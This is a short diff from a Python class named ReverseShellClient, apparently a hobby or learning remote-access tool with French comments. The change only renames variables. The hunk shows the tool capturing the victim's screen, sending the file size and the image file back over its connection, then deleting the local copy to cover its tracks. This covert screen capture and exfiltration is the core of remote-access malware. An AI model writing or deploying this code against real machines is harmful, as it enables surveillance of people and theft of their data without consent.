@@ -135,10 +135,10 @@ class ReverseShellClient:
                 with mss() as sct: # Utilisation de la librairie mss
                     sct.shot(output="screenshot.png") # Prendre une capture d'écran et l'enregistrer dans un fichier
             else:
-                screenshot = ImageGrab.grab() # Prendre une capture d'écran
-                screenshot.save("screenshot.png") #     Enregistrer la capture d'écran dans un fichier
-            len_img = str(os.path.getsize("screenshot.png")) # Récupérer la taille du fichier
-            self.conn.send(len_img.encode("utf-8")) # Envoyer la taille du fichier
+                screenshot_linux = ImageGrab.grab() # Prendre une capture d'écran
+                screenshot_linux.save("screenshot.png") #     Enregistrer la capture d'écran dans un fichier
+            taille_img = str(os.path.getsize("screenshot.png")) # Récupérer la taille du fichier
+            self.conn.send(taille_img.encode("utf-8")) # Envoyer la taille du fichier
             with open("screenshot.png", "rb") as img: # Ouvrir le fichier en mode lecture binaire
                 self.conn.sendfile(img) # Envoyer le fichier
             os.remove("screenshot.png")   # Supprimer le fichier
